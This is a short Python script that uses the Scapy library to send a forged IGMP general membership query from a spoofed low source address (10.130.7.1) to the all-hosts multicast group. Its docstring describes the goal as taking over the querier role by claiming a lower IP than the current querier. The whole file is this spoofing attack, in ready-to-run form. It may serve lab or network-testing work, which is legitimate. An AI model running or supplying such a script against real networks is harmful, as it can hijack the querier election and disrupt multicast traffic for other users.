#!venv/bin/python

from scapy.all import *
from scapy.contrib.igmp import IGMP
from scapy.all import Ether, IP

"""
Spoof the place of a querier with lower ip addr than him
"""

source_interface = "Ethernet"

pck = Ether()/IP(src="10.130.7.1", dst="224.0.0.1")/IGMP(type=17, gaddr="0.0.0.0")
sendp(pck, iface=source_interface)